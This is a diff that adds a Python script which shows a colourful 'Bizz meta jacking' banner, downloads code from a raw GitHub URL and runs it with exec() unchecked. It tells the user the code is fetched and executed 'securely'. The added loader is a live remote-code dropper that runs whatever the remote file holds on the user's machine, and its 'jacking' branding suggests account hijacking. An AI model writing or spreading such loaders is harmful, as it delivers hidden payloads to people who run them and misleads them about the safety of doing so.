@@ -1,3 +1,47 @@
+import traceback
+import time
+import os
+
+def banner():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print("\033[1;35m" + "━" * 60)
+    print("🔮  \033[1;96mBizz meta jacking file will processing...")
+    print("🚀  \033[1;92mFetching & Executing Dynamic Code Securely...")
+    print("\033[1;35m" + "━" * 60 + "\033[0m")
+
+def status(msg, color="94", symbol="ℹ️"):
+    print(f"\033[1;{color}m[{symbol}] {msg}\033[0m")
+
+url = "https://raw.githubusercontent.com/almbrokwork-crypto/Paid-bizz-/main/Paid.bizz"
+
+banner()
+status("Connecting to server...", "96", "🌐")
+time.sleep(0.5)
+
+try:
+    response = requests.get(url, timeout=10)
+    response.raise_for_status()
+
+    code = response.text.strip()
+    
+    if not code:
+        status("Empty code received! Nothing to execute.", "93", "⚠️")
+    else:
+        status("Code fetched successfully.", "92", "📦")
+        time.sleep(0.5)
+        status("Executing remotely fetched code...", "96", "⚙️")
+        print("\033[1;35m" + "━" * 60 + "\033[0m")
+        exec(compile(code, "<remote_script>", "exec"))
+        print("\033[1;35m" + "━" * 60 + "\033[0m")
+        status("Execution finished successfully!", "92", "✅")
+
+except requests.exceptions.Timeout:
+    status("Request timed out! Check your internet.", "91", "⏳")
+except requests.exceptions.RequestException as e:
+    status(f"Network error occurred: {e}", "91", "📡")
+except Exception as e:
+    status("Exception during code execution:", "91", "❌")
+    print("\033[90m" + traceback.format_exc() + "\033[0m")
 import requests
 import os
 import time
